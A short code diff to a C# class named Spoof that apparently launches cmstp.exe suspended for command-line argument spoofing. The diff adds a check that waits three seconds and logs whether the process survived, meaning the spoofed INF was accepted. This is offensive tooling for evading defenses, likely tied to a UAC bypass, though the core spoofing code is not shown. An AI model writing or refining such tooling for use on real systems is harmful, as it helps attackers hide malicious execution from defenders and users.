@@ -1,7 +1,9 @@
 using System;
+using System.Diagnostics;
 using System.IO;
 using System.Runtime.InteropServices;
 using System.Text;
+using System.Threading;
 
 public static class Spoof
 {
@@ -191,6 +193,15 @@ public static class Spoof
 
         Log("[*] Resuming cmstp.exe thread...");
         ResumeThread(pi.hThread);
+        Log("[*] Watching cmstp.exe for 3s...");
+        Thread.Sleep(3000);
+        Process[] procs = Process.GetProcessesByName("cmstp");
+        if (procs.Length > 0) {
+            Log("[+] cmstp.exe alive after 3s (PID=" + procs[0].Id + ") - INF accepted");
+        } else {
+            Log("[-] cmstp.exe exited within 3s - INF processing likely failed");
+            Log("[-] Check Windows Event Log -> Application for cmstp.exe errors");
+        }
         CloseHandle(pi.hProcess);
         CloseHandle(pi.hThread);
         Log("[+] cmstp.exe resumed, argument spoofing complete");
